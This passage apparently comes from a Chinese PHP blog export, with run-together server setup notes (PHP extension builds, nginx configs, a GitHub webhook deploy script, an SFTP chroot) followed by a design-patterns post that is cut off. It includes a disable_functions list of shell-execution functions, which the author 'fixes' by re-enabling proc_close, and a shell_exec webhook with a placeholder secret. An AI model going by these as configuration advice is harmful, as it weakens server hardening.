/root/shadowsocks-php/Workerman/Worker.php(1586): Workerman\Worker::forkWorkers()#10 /root/shadowsocks-php/Workerman/Worker.php(1535): Workerman\Worker::monitorWorkersForLinux()#11 /root/shadowsocks-php/Workerman/Worker.php(509): Workerman\Worker::monitorWorkers()#12 /root/shadowsocks-php/start.php(32): Workerman\Worker::runAll()#13 &#123;main&#125;2018-12-10 14:04:56 pid:2595 Worker[2595] process terminated2018-12-10 14:04:56 pid:32505 worker[shadowsocks-server:2595] exit with status 64000[root@VM_0_14_centos shadowsocks-php]# cd /root/php-7.2.3/ext/openssl/[root@VM_0_14_centos openssl]# /usr/local/php/bin/phpizeCannot find config.m4.Make sure that you run '/usr/local/php/bin/phpize' in the top level source directory of the module#mv config0.m4 config.m4#/usr/local/php/bin/phpize#./configure --with-php-config=/usr/local/php/bin/php-config如果此步报Cannot find OpenSSL's &lt;evp.h&gt; 的错误执行以下命令： yum install openssl openssl-devel ln -s /usr/lib64/libssl.so /usr/lib/#make &amp;&amp; make install[root@VM_0_14_centos openssl]# vi /usr/local/php/lib/php.ini[root@VM_0_14_centos openssl]# php -m|grep openopenssl[root@VM_0_14_centos shadowsocks-php]# php start.php statusWorkerman[start.php] status----------------------------------------------GLOBAL STATUS----------------------------------------------------Workerman version:3.5.16 PHP version:7.2.3start time:2018-12-10 14:56:01 run 0 days 0 hoursload average: 0.12, 0, 0 event-loop:\Workerman\Events\Select2 workers 24 processesworker_name exit_status exit_countshadowsocks-server 0 0shadowsocks-server 0 0[root@VM_0_14_centos shadowsocks-php]# php start.php connectionsWorkerman[start.php] connections--------------------------------------------------------------------- WORKERMAN CONNECTION STATUS --------------------------------------------------------------------------------PID Worker CID Trans Protocol ipv4 ipv6 Recv-Q Send-Q Bytes-R Bytes-W Status Local Address Foreign Address11140 shadowsocks-.. 1 tcp tcp 1 0 0B 0B 20.4KB 5.9KB ESTABLISHED#cd /root/php7-2.3/ext/curl#./configure --with-php-config=/usr/local/php/bin/php-configconfigure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.checking for gawk... gawkchecking for cURL support... yes, sharedchecking for pkg-config... /usr/bin/pkg-configchecking for libcurl.pc... using default pathchecking for cURL 7.10.5 or greater... configure: error: cURL version 7.10.5 or later is required to compile php with cURL supportcurl: try 'curl --help' or 'curl --manual' for more information[root@VM_0_14_centos curl]# curl -Vcurl 7.29.0 (x86_64-redhat-linux-gnu) libcurl/7.29.0 NSS/3.36 zlib/1.2.7 libidn/1.28 libssh2/1.4.3Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp scp sftp smtp smtps telnet tftpFeatures: AsynchDNS GSS-Negotiate IDN IPv6 Largefile NTLM NTLM_WB SSL libz unix-sockets[root@VM_0_14_centos curl]# yum install curl-develLoaded plugins: fastestmirror, langpacksRepository epel is listed more than once in the configurationcarlwgeorge-ripgrep | 3.0 kB 00:00:00docker-ce-stable#./configure --with-php-config=/usr/local/php/bin/php-config#make &amp;&amp; make install#nginx集群配置 https://github.com/Gopusher/gatewayupstream websocket &#123; server 192.168.3.165:8900 weight=1; server 192.168.3.165:8902 weight=1;&#125;server &#123; listen 8910; server_name www.chat.com$; location / &#123; proxy_pass http://websocket; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection "upgrade"; &#125;&#125;安装MySQLi#cd /root/php-7.23/ext#cd mysqli#phpize#./configure --with-php-config=/usr/local/php/bin/php-config --with-mysql=mysqlndconfigure: creating ./config.statusconfig.status: creating config.hconfig.status: config.h is unchangedconfigure: WARNING: unrecognized options: --with-mysql[root@VM_0_14_centos mysqli]# ./configure --with-php-config=/usr/local/php/bin/php-config --with-mysqli=mysqlndcreating libtoolappending configuration tag "CXX" to libtoolconfigure: creating ./config.statusconfig.status: creating config.hconfig.status: config.h is unchanged[root@VM_0_14_centos mysqli]# make &amp;&amp; make installIn file included from /root/php-7.2.3/ext/mysqli/mysqli.c:34:0:/root/php-7.2.3/ext/mysqli/php_mysqli_structs.h:42:33: fatal error: ext/mysqlnd/mysqlnd.h: No such file or directory #include "ext/mysqlnd/mysqlnd.h" ^compilation terminated.make: *** [mysqli.lo] Error 1#mkdir -p mysqli/ext#cp -r mysqlnd mysqli/ext#cd mysqli##make &amp;&amp; make installBuild complete.Don't forget to run 'make test'.Installing shared extensions: /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/Installing header files: /usr/local/php/include/php/ HTTPS配置123456789101112131415161718192021222324252627282930313233343536373839404142434445//https://www.omybug.com/2016/11/02/Nginx%E4%B8%8BHTTPS%E9%85%8D%E7%BD%AE/server&#123; listen 80; server_name www.xxxx.com; rewrite ^ https://$server_name$request_uri? permanent;&#125;server&#123; listen 443; ssl on; ssl_certificate /home/cert/xxxx.crt; ssl_certificate_key /home/cert/xxxx.key.unsecure; server_name www.xxxx.com; index index.php index.html; root /data/www/xxxx/; ssl_certificate /data/soft/ssl/xxxx.crt; ssl_certificate_key /data/soft/ssl/xxxx.key.unsecure; #include other.conf; error_page 404 /404.html; include enable-php.conf; location / &#123; try_files $uri $uri/ /index.php?$query_string; &#125; location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123; expires 30d; &#125; location ~ .*\.(js|css)?$ &#123; expires 12h; &#125; location ~ /\. &#123; deny all; &#125; access_log /home/wwwlogs/xxxx.log; &#125; openssl rsa -in xxxx.key -out xxxx.key.unsecure php rdkafka12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394https://arnaud-lb.github.io/php-rdkafka/phpdoc/rdkafka.installation.manual.html[root@VM_0_14_centos test]# git clone https://github.com/arnaud-lb/php-rdkafka.git[root@VM_0_14_centos test]# cd ~[root@VM_0_14_centos ~]# git clone https://github.com/arnaud-lb/php-rdkafka.gitCloning into 'php-rdkafka'...remote: Enumerating objects: 4, done.remote: Counting objects: 100% (4/4), done.remote: Compressing objects: 100% (4/4), done.remote: Total 1231 (delta 0), reused 1 (delta 0), pack-reused 1227Receiving objects: 100% (1231/1231), 401.61 KiB | 250.00 KiB/s, done.Resolving deltas: 100% (838/838), done.[root@VM_0_14_centos ~]# cd php-rdkafka/[root@VM_0_14_centos php-rdkafka]# /usr/local/php/bin/phpizeConfiguring for:PHP Api Version: 20170718Zend Module Api No: 20170718Zend Extension Api No: 320170718[root@VM_0_14_centos php-rdkafka]# ./configure --with-php-config=/usr/local/php/bin/php-configchecking for grep that handles long lines and -e... /usr/bin/grepchecking for egrep... /usr/bin/grep -Echecking for a sed that does not truncate output... /usr/bin/sedchecking for cc... ccchecking whether the C compiler works... yeschecking for C compiler default output file name... a.outchecking for suffix of executables...checking whether we are cross compiling... nochecking for suffix of object files... ochecking whether we are using the GNU C compiler... yeschecking whether cc accepts -g... yeschecking for cc option to accept ISO C89... none neededchecking how to run the C preprocessor... cc -Echecking for icc... nochecking for suncc... nochecking whether cc understands -c and -o together... yeschecking for system library directory... libchecking if compiler supports -R... nochecking if compiler supports -Wl,-rpath,... yeschecking build system type... x86_64-unknown-linux-gnuchecking host system type... x86_64-unknown-linux-gnuchecking target system type... x86_64-unknown-linux-gnuchecking for PHP prefix... /usr/local/phpchecking for PHP includes... -I/usr/local/php/include/php -I/usr/local/php/include/php/main -I/usr/local/php/include/php/TSRM -I/usr/local/php/include/php/Zend -I/usr/local/php/include/php/ext -I/usr/local/php/include/php/ext/date/libchecking for PHP extension directory... /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718checking for PHP installed headers prefix... /usr/local/php/include/phpchecking if debug is enabled... nochecking if zts is enabled... nochecking for re2c... noconfigure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.checking for gawk... gawkchecking for rdkafka support... yes, sharedchecking for librdkafka/rdkafka.h" in default path... not foundconfigure: error: Please reinstall the rdkafka distribution[root@VM_0_14_centos php-rdkafka]# yum -y install re2c或者wget https://sourceforge.net/projects/re2c/files/0.16/re2c-0.16.tar.gztar zxf re2c-0.16.tar.gz &amp;&amp; cd re2c-0.16./configuremake &amp;&amp; make install [root@VM_0_14_centos php-rdkafka]# ./configure --with-php-config=/usr/local/php/bin/php-configchecking for PHP extension directory... /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718checking for PHP installed headers prefix... /usr/local/php/include/phpchecking if debug is enabled... nochecking if zts is enabled... nochecking for re2c... re2cchecking for re2c version... 0.14.3 (ok)checking for gawk... gawkchecking for rdkafka support... yes, sharedchecking for librdkafka/rdkafka.h" in default path... not foundconfigure: error: Please reinstall the rdkafka distribution$ git clone https://github.com/edenhill/librdkafka.git$ cd librdkafka$ ./configure$ make &amp;&amp; make install$cd ../php-rdkafka$./configure --with-php-config=/usr/local/php/bin/php-config$make all -j 5 &amp;&amp; make installInstalling shared extensions: /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/[root@VM_0_14_centos php-rdkafka]# php -i | grep extension_dirextension_dir =&gt; /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718 =&gt; /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718sqlite3.extension_dir =&gt; no value =&gt; no value[root@VM_0_14_centos php-rdkafka]# php --iniConfiguration File (php.ini) Path: /usr/local/php/libLoaded Configuration File: /usr/local/php/lib/php.iniScan for additional .ini files in: (none)Additional .ini files parsed: (none)[root@VM_0_14_centos php-rdkafka]# vi /usr/local/php/lib/php.ini[root@VM_0_14_centos php-rdkafka]# php -m|grep rdrdkafka检测扩展是否安装成功在命令行中运行php7 -r " new RdKafka\Conf();" 如果没有报错说明安装成功了 查错方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899xhprof 生成图片失败，使用的代码function xhprof_generate_image_by_dot($dot_script, $type) &#123; $descriptorspec = array( // stdin is a pipe that the child will read from 0 =&gt; array("pipe", "r"), // stdout is a pipe that the child will write to 1 =&gt; array("pipe", "w"), // stderr is a pipe that the child will write to 2 =&gt; array("pipe", "w") ); $cmd = " dot -T".$type; $process = proc_open( $cmd, $descriptorspec, $pipes, sys_get_temp_dir(), array( 'PATH' =&gt; getenv( 'PATH' ) ) ); if (is_resource($process)) &#123; fwrite($pipes[0], $dot_script); fclose($pipes[0]); $output = stream_get_contents($pipes[1]); $err = stream_get_contents($pipes[2]); if (!empty($err)) &#123; print "failed to execute cmd: \"$cmd\". stderr: `$err'\n"; exit; &#125; fclose($pipes[2]); fclose($pipes[1]); proc_close($process); return $output; &#125; print "failed to execute cmd \"$cmd\""; exit();&#125; [root@VM_0_14_centos incubator-superset]# php --iniConfiguration File (php.ini) Path: /usr/local/php/libLoaded Configuration File: /usr/local/php/lib/php.iniScan for additional .ini files in: (none)Additional .ini files parsed: (none)#cat /usr/local/php/lib/php.ini|grep error|grep -v ';'error_reporting = E_ALLdisplay_errors = Ondisplay_startup_errors = Onlog_errors = Onerror_log="/usr/local/php/error.log"log_errors_max_len = 1024ignore_repeated_errors = Offhtml_errors = On#tail -f /usr/local/php/error.log[root@VM_0_14_centos incubator-superset]# ps aux|grep fpmroot 408 0.0 0.0 112704 968 pts/3 S+ 11:17 0:00 grep --color=auto fpmroot 575 0.0 0.0 4616 8 ? Ss Nov12 0:00 /bin/sh -c /usr/bin/php-fpmroot 653 0.0 0.0 18364 0 ? S Nov12 0:00 bash /usr/bin/php-fpmroot 654 0.0 0.0 515736 280 ? Ss Nov12 2:26 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)33 2156 0.0 0.1 380220 3604 ? S Nov08 0:06 php-fpm: pool www33 10893 0.0 0.1 380220 3488 ? S Nov16 0:05 php-fpm: pool www#cat /etc/php/7.2/fpm/php-fpm.conf[global]pid = var/run/php-fpm.piderror_log = var/logs/php-fpm.logprocess_control_timeout = 0daemonize = yesrlimit_files = 65535rlimit_core = 10240events.mechanism = epollinclude = conf.d/*.conf#tail -f /etc/php/7.2/fpm/var/logs/php-fpm.log#cat /etc/php/7.2/fpm/conf.d/www.conf |grep error# ps aux|grep nginxsuping3 10898 0.0 0.0 103252 860 pts/8 S+ 11:20 0:00 grep nginxroot 11493 0.0 0.2 137460 29168 ? Ss 03:50 0:00 nginx: master process /usr/local/sbin/nginx -c /usr/local/etc/nginx.confwww 11494 0.0 0.3 143744 37448 ? S 03:50 0:03 nginx: worker process www 11496 0.0 0.3 143744 37444 ? S 03:50 0:04 nginx: worker process #cat /usr/local/etc/nginx.conf index index.html index.shtml index.php /index.php; include nginx.fastcgi_params; include nginx.uwsgi_params; include vhost.d/*.conf;[suping3@hathor69 ~]$ cat /usr/local/etc/vhost.d/www.confserver &#123; listen 80 ; root /data1/www/htdocs; server_name test.com ; access_log /data1/www/logs/all_items_http_log main; error_log /data1/www/logs/error_log; access_log /data1/www/logs/access_log main;#tail -f /data1/www/logs/error_log2018/12/20 11:01:00 [error] 11510#0: *591810 FastCGI sent in stderr: "PHP message: Warning: Must specify directory location for XHProf runs. Trying /tmp as default. You can either pass the directory location as an argument to the constructor for XHProfRuns_Default() or set xhprof.output_dir ini param.PHP message: PHP Warning: proc_close() has been disabled for security reasons in /data1/www/htdocs/public/xhprof/xhprof_lib/utils/callgraph_utils.php on line 127" while reading response header from upstream, client: 10.235.51.37, server: test.com, request: "GET /public/xhprof/xhprof_html/callgraph.php?run=5c1a16bf8dc14&amp;source=laravel HTTP/1.1", upstream: "fastcgi://127.0.0.1:9149", host: "test.com"#cat /usr/local/php/lib/php.ini|grep disable|grep -v ';'disable_functions = phpinfo,system,exec,shell_exec,proc_close,passthru,show_sourcedisable_classes =打开proc_close函数就好了 中国大陆地区需要配置镜像12345678IS_MAINLAND_CHINA=$(curl -s https://api.ip.sb/geoip | grep China)if [ "$IS_MAINLAND_CHINA" ];then composer config -g repo.packagist composer https://packagist.laravel-china.orgfi[root@VM_0_14_centos ~]# curl https://api.ip.sb/geoip&#123;"offset":"8","longitude":116.3883,"timezone":"Asia\/Harbin","latitude":39.9289,"area_code":"0","region":"Beijing","dma_code":"0","organization":"AS45090 Shenzhen Tencent Computer Systems Company Limited","country":"China","ip":"118.24.158.116","country_code3":"CHN","continent_code":"AS","country_code":"CN","region_code":"22"&#125; webhook自动部署1234567891011121314151617181920212223242526272829303132333435363738394041424344https://laravel-china.org/articles/5012/gitlab-webhooks-implements-automated-server-project-deploymenthttps://laravel-china.org/articles/15949ssh-keygen -t rsa一直按回车键直到结束。系统会在~/.ssh 目录中生成 id_rsa和id_rsa.pub，即密钥id_rsa和公钥id_rsa.pub。向GitHub添加秘钥 点击 New SSH key 按钮 https://github.com/settings/keys ，添加上面生成的 id_rsa.pub 公钥内容#git clone git@github.com:sushengbuhuo/autoload_demo.git#chown -R nodbody:nobody autoload_demo[root@VM_0_14_centos autoload_demo]# ssh -T git@github.comWarning: Permanently added the RSA host key for IP address '52.74.223.119' to the list of known hosts.Hi sushengbuhuo/autoload_demo! You've successfully authenticated, but GitHub does not provide shell access.进入项目https://github.com/sushengbuhuo/autoload_demo/settings/hooks设置Payload URL和Secret#vi webhook.php&lt;?php// GitHub Webhook Secret.// GitHub项目 Settings/Webhooks 中的 Secret$secret = "token";// Path to your respostory on your server.// e.g. "/var/www/respostory"// 项目地址$path = "/usr/share/nginx/html/autoload_demo/";// Headers deliveried from GitHub$signature = $_SERVER['HTTP_X_HUB_SIGNATURE'];if ($signature) &#123; $hash = "sha1=".hash_hmac('sha1', file_get_contents("php://input"), $secret); if (strcmp($signature, $hash) == 0) &#123; echo shell_exec("cd &#123;$path&#125; &amp;&amp; /usr/bin/git reset --hard origin/master &amp;&amp; /usr/bin/git clean -f &amp;&amp; /usr/bin/git pull 2&gt;&amp;1"); exit(); &#125;&#125;#git commit -am "2019"#git push origin master权限配置$ sudo ps aux | grep phpwww 22131 0.0 0.2 42872 23096 ? S 02:13 0:03 nginx: worker processwww 22132 0.0 0.2 42900 23352 ? S 02:13 0:01 nginx: worker process$sudo ps aux | grep php-fpmwww 22347 0.0 0.1 163832 9008 ? S 02:13 0:00 php-fpm: pool www$ sudo chown -R www:www /mnt/www/project sftp1234567891011121314151617groupadd sftpuseradd -g sftp -s /sbin/nologin -M sftpUserpasswd sftpUserchown root:sftp /home/wwwrootchmod 755 /home/wwwrootsudo chown www:sftp -R /home/wwwroot/default chmod 775 -R /home/wwwroot/default vim /etc/ssh/sshd_config Subsystem sftp internal-sftp Match Group sftp #限制的用户组 ChrootDirectory /home/wwwroot #根目录 ForceCommand internal-sftp AllowTcpForwarding no X11Forwarding no sshd -t systemctl restart sshd sftp -P 2222 sftpUser@127.0.0.1 多 Laravel 项目配置1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162http &#123; access_log /dev/null; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 120; client_header_buffer_size 256k; large_client_header_buffers 4 256k; client_max_body_size 200M; client_body_buffer_size 512k; map $host $dir &#123; ~^(.*)$ /Home/user/laravel/$1/public; &#125; server &#123; listen 80; listen 443 ssl http2; ssl_certificate /home/ssl.crt; ssl_certificate_key /home/ssl.key; server_name _; root $dir; location / &#123; index index.html index.htm index.php; try_files $uri $uri/ /index.php?$query_string; &#125; location ~ \.php$ &#123; try_files $uri =404; fastcgi_split_path_info ^(.+\.php)(/.+)$; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param QUERY_STRING $query_string; include fastcgi_params; &#125; location = /debug &#123; default_type text/plain; return 200 $dir; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125;在 /etc/hosts 中, 添加如下127.0.0.1 a.site.com127.0.0.1 b.site.com然后/Home/user/laravel/a.site.com/ 部署 a.site.com 的项目/Home/user/laravel/b.site.com/ 部署 b.site.com 的项目重点在那个 map 指令上. 具体用法大家自己看文档去吧 安装openssl12345678910111213141516171819202122232425262728293031cd /usr/local/src/php/extension/openssl运行phpize命令运行 ./configure --with-php-config=/usr/local/php/bin/php-config命令运行make &amp; make install如果报错pcntl.lo' is not a valid libtool object或者其他类似not a valid libtool object的错误运行make cleanmake install执行成功之后会产生一个.so文件，记住这个文件的位置phpize可能会出现以下错误Cannot find config.m4. Make sure that you run '/opt/local/bin/phpize' in the top level source directory of the module将config0.m4改名为config.m4或者直接·cp config0.m4 config.m4就可以解决在php.ini配置文件中添加以下内容#我的.so文件统一放在/usr/local/lib/php/extension目录下extension_dir="/usr/local/lib/php/extension"extension=openssl.so找到php-fpm master进程 https://learnku.com/articles/24557ps aux | grep php-fpmroot 2367 0.0 0.5 212856 5764 ? Ss Feb22 0:03 php-fpm: master process (/usr/local/php/etc/php-fpm.conf)www-data 2368 0.0 0.5 214940 5680 ? S Feb22 0:00 php-fpm: pool wwwwww-data 2369 0.0 0.5 214940 5680 ? S Feb22 0:00 php-fpm: pool wwwroot 13193 0.0 0.0 110276 900 pts/0 R+ 23:15 0:00 grep --color=auto php-fpmpid是2367重启这个进程 kill -USR2 2367 INT, TERM 立刻终止QUIT 平滑终止USR1 重新打开日志文件USR2 平滑重载所有worker进程并重新载入配置和二进制模块 升级 PHP71234567891011121314151617181920212223242526利用 PHPCS和PHPCompatibility 对项目进行PHP7的编码规范检测。//PHPCS和PHPCompatibility安装和使用流程mkdir /tmp/php_codesniffer curl -s http://getcomposer.org/installer | php ./composer.phar config -g repo.packagist composer https://packagist.phpcomposer.com ./composer.phar selfupdate ./composer.phar require "squizlabs/php_codesniffer=*" cd /tmp/PHPCompatibility git clone https://github.com/wimg/PHPCompatibility.git /tmp/PHPCompatibility/vendor/bin/phpcs --config-set installed_paths /tmp/PHPCompatibility/PHPCompatibility/ /tmp/PHPCompatibility/vendor/bin/phpcs -i /tmp/PHPCompatibility/vendor/bin/phpcs --standard=PHPCompatibility --report-file=/tmp/check_php7_report [项目路径] 之后就可以根据生成的报表'/tmp/check_php7_report'，逐条对项目代码进行处理了。调用过的接口使用脚本分别在PHP5.6和PHP7的环境下重新调用获取返回值，把两次的返回值md5加密后进行对比有了方案后处理起来并不难，按照预期应该是一致的，但是确实存在问题了php7的json_encode处理float类型会出现溢出的现象php5.6:[6.28] &gt;&gt;&gt; json_encode(6.28)=&gt; "6.28"php7:[6.2800000000000002] &gt;&gt;&gt; json_encode(6.28)=&gt; "6.2800000000000002"解决方案：修改php.ini中serialize_precision 到17以下，自测php7恢复正常 PHP 项目基础运行环境搭建 升级 PHP7 过程记录 Nginx 极简教程 生成NGINX配置文件 git 使用 Homestead 最佳PHP开发环境 Composer 简明教程 CentOS下多版本PHP配置 CentOs 同时使用多个php版本 php 安装swoole错误 全新centos系统下源码安装php+nginx Ubuntu 16.04 环境安装部署 无字母数字webshell之提高篇 preg_replace引发的phpmyadmin(4.3.0-4.6.2)命令执行漏洞 swoole聊天室 php chatroom yum安装lnmp leetcode 从零开始打造自己的PHP框架 Ubuntu 安装 PHP 和 Composer CentOS 下手动编译 nginx 以及相关配置 Manually Installing the extension rdkafka LNMP 安装脚本 PHP 使用 Kafka 安装拾遗 五天学会一种web开发框架 用了那么多 LNMP, 你真的了解 N 与 P 交互吗 CentOS7中部署php7.1及开启MySQL扩展 php5.5 升级到 php7.2 Ubuntu18.04 桌面版 搭建 LNMP 环境 狂撸一款PHP现代化框架]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈php设计模式]]></title>
    <url>%2F2018%2F11%2F26%2F%E6%B5%85%E8%B0%88php%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[本文来自laravel-china 接口和抽象类的概念有点相似： 接口：一个类要实现一个接口，类中必须实现接口中定义的所有方法，接口中定义的所有方法都必须是公有。 抽象类：一个类继承抽象类，子类必须定义父类中的所有抽象方法，子类中的方法访问控制（public、protected 、private）必须和父类中一样（或者更为宽松），例如某个抽象方法被声明为受保护的，那么子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。（私有比受保护的更高级和更严格） 设计模式六大原则 开放封闭原则：一个软件实体如类、模块和函数应该对扩展开放，对修改关闭。 里氏替换原则：所有引用基类的地方必须能透明地使用其子类的对象. 依赖倒置原则：高层模块不应该依赖低层模块，二者都应该依赖其抽象；抽象不应该依赖细节；细节应该依赖抽象。 单一职责原则：不要存在多于一个导致类变更的原因。通俗的说，即一个类只负责一项职责。 接口隔离原则：客户端不应该依赖它不需要的接口；一个类对另一个类的依赖应该建立在最小的接口上。 迪米特法则 ：一个对象应该对其他对象保持最少的了解。 单例模式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php/** * 单例模式 */class Singleton&#123; /** * @var self[保存实例] */ private static $instance; /** * @var */ public $mix; /** * return self instance [创建一个用来实例化对象的方法] */ public static function getInstace() &#123; var_dump(isset(self::$instance)); if (!self::$instance instanceof self) &#123; self::$instance = new self(); &#125; return self::$instance; &#125; /** * Singleton constructor.构造函数为private，防止创建对象 */ private function __construct() &#123; echo "实例初始化了"; &#125; private function __clone() &#123; // TODO: Implement __clone() method. trigger_error('Clone is not allowed!'); &#125;&#125;// @Test$firstSingle = Singleton::getInstace();$secondSingle = Singleton::getInstace();//bool(false) 实例初始化了bool(true)$firstSingle-&gt;mix = 'one';//一开始mix是赋值‘one',所以打印出oneprint_r($firstSingle-&gt;mix);//由于getInstace该方法保证了Singleton类只能有一个实例，不会再重新new，minx依然用firstSingle的，mix被改变成’two‘$secondSingle-&gt;mix = 'two'; print_r($firstSingle-&gt;mix);//TWOprint_r($secondSingle-&gt;mix);//TWO 简单工厂模式12345678910111213141516171819202122232425262728&lt;?php //简单工厂模式class ProductA&#123; function __construct() &#123; echo "I am ProductA class &lt;br&gt;"; &#125;&#125;class ProductB&#123; function __construct() &#123; echo "I am ProductB class &lt;br&gt;"; &#125;&#125;class Factory&#123; public static function CreateProduct($name)&#123; if ($name == 'A') &#123; return new ProductA(); &#125; elseif ($name == 'B') &#123; return new ProductB(); &#125; &#125;&#125;$cat = Factory::CreateProduct('A');$dog = Factory::CreateProduct('B'); 一对一抽象工厂模式1234567891011121314151617181920212223242526272829303132333435363738&lt;?php interface Product&#123; //产品接口（核心类） public function getProduct(); &#125; class ProductA implements Product //A类产品 &#123; public function getProduct()&#123; echo "I'm ProductA &lt;br&gt;"; &#125; &#125; class ProductB implements Product /B类产品 &#123; public function getProduct()&#123; echo "I'm ProductB &lt;br&gt;"; &#125; &#125; abstract class Factory&#123; //抽象工厂类（抽象类）（核心工厂类） abstract static function createProduct(); &#125; class ProductAFactory extends Factory //A工厂继承工厂类 &#123; public static function createProduct() &#123; return new ProductA(); //A工厂创建A产品类对象 &#125; &#125; class ProductBFactory extends Product //B工厂继承工厂类 &#123; public static function createProduct() &#123; return new ProductB(); //B工厂创建B产品类对象 &#125; &#125; 注意：声明为static的静态方法不能通过new实例化对象进行访问，必须使用类名::方法名() 访问 $ProductA = ProductAFactory::createProduct(); $ProductA-&gt;getProduct(); $ProductB = ProductBFactory::createProduct(); $ProductB-&gt;getProduct(); 一对多抽象工厂模式12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?php interface Mouse&#123; //鼠标产品接口（核心类） public function getMouse(); //获取鼠标 &#125;class DellMouse implements Mouse //戴尔类产品 &#123; public function getMouse()&#123; echo "我是戴尔鼠标&lt;br&gt;"; &#125; &#125;class LenovoMouse implements Mouse //联想类产品 &#123; public function getMouse()&#123; echo "我是联想鼠标&lt;br&gt;"; &#125; &#125;interface Keybo&#123; //键盘产品接口（核心类） public function getKeybo(); //获取键盘 &#125;class DellKeybo implements Keybo //戴尔类产品 &#123; public function getKeybo()&#123; echo "我是戴尔键盘&lt;br&gt;"; &#125; &#125;class LenovoKeybo implements Keybo //联想类产品 &#123; public function getKeybo()&#123; echo "我是联想键盘&lt;br&gt;"; &#125; &#125;abstract class Factory&#123; //抽象工厂类（核心工厂类） abstract static function createMouse(); //生产鼠标 abstract static function createKeybo();//生产键盘 &#125;class DellFactory extends Factory //戴尔牌工厂继承工厂类 &#123; public static function createMouse() &#123; return new DellMouse(); //工厂创建戴尔鼠标类对象 &#125; public static function createKeybo() &#123; return new DellKeybo(); //工厂创建戴尔键盘类对象 &#125; &#125;class LenovoFactory extends Factory //联想牌工厂继承工厂类 &#123; public static function createMouse() &#123; return new LenovoMouse(); //工厂创建联想鼠标类对象 &#125; public static function createKeybo() &#123; return new LenovoKeybo(); //工厂创建联想键盘类对象 &#125; &#125; //输出“我是戴尔鼠标” $dell_mouse =DellFactory::createMouse(); echo $dell_mouse-&gt;getMouse(); //输出“我是戴尔键盘” $dell_keybo = DellFactory::createKeybo(); echo $dell_keybo-&gt;getKeybo(); //输出“我是联想鼠标” $lenovo_mouse = LenovoFactory::createMouse(); echo $lenovo_mouse-&gt;getMouse(); //输出“我是联想键盘” $lenovo_keybo = LenovoFactory::createKeybo(); echo $lenovo_keybo-&gt;getKeybo(); self static12345678910111213141516171819202122232425262728293031323334353637383940//实例代码1&lt;?phpclass A&#123; const CURRENT = 'A'; const A = 'A';&#125;class B extends A&#123; const CURRENT = 'B'; public function get()&#123; echo self::CURRENT.PHP_EOL.self::A; //这儿用的self关键字 &#125;&#125;class C extends B&#123; const CURRENT = 'C';&#125;$b = new C();$b-&gt;get();$ php selfBind.phpBA//实例代码2&lt;?phpclass A&#123; const CURRENT = 'A'; const A = 'A';&#125;class B extends A&#123; const CURRENT = 'B'; public function get()&#123; echo static::CURRENT.PHP_EOL.static::A; //这儿用的static关键字 https://www.snail-c.cn/article/2 &#125;&#125;class C extends B&#123; const CURRENT = 'C';&#125;$b = new C();$b-&gt;get();$ php selfBind.phpCA ioc123456789101112IOC理论提出的观点大体是这样的：借助于“第三方”实现具有依赖关系的对象之间的解耦由于引进了中间位置的“第三方”，也就是IOC容器，使得A、B、C、D这4个对象没有了耦合关系，齿轮之间的传动全部依靠“第三方”了，全部对象的控制权全部上缴给“第三方”IOC容器，所以，IOC容器成了整个系统的关键核心，它起到了一种类似“粘合剂”的作用，把系统中的所有对象粘合在一起发挥作用，如果没有这个“粘合剂”，对象与对象之间会彼此失去联系，这就是有人把IOC容器比喻成“粘合剂”的由来。软件系统在没有引入IOC容器之前，如图1所示，对象A依赖于对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上。软件系统在引入IOC容器之后，这种情形就完全改变了，如图3所示，由于IOC容器的加入，对象A与对象B之间失去了直接联系，所以，当对象A运行到需要对象B的时候，IOC容器会主动创建一个对象B注入到对象A需要的地方。控制被反转之后，获得依赖对象的过程由自身管理变为了由IOC容器主动注入。于是，他给“控制反转”取了一个更合适的名字叫做“依赖注入（Dependency Injection）”。他的这个答案，实际上给出了实现IOC的方法：注入。所谓依赖注入，就是由IOC容器在运行期间，动态地将某种依赖关系注入到对象之中。所以，依赖注入(DI)和控制反转(IOC)是从不同的角度的描述的同一件事情，就是指通过引入IOC容器，利用依赖关系注入的方式，实现对象之间的解耦。https://learnku.com/articles/22769 多例模式12345678910111213141516171819202122232425262728293031323334353637383940414243abstract class Multiton &#123; private static $instances = array(); public static function getInstance() &#123; $key = get_called_class() . serialize(func_get_args()); if (!isset(self::$instances[$key])) &#123; $rc = new ReflectionClass(get_called_class()); self::$instances[$key] = $rc-&gt;newInstanceArgs(func_get_args()); &#125; return self::$instances[$key]; &#125; /** * 该私有对象阻止实例被克隆 */ private function __clone() &#123; &#125; /** * 该私有方法阻止实例被序列化 */ private function __wakeup() &#123; &#125;&#125; class Hello extends Multiton &#123; public function __construct($string = 'World') &#123; echo "Hello $string\n"; &#125; &#125; class GoodBye extends Multiton 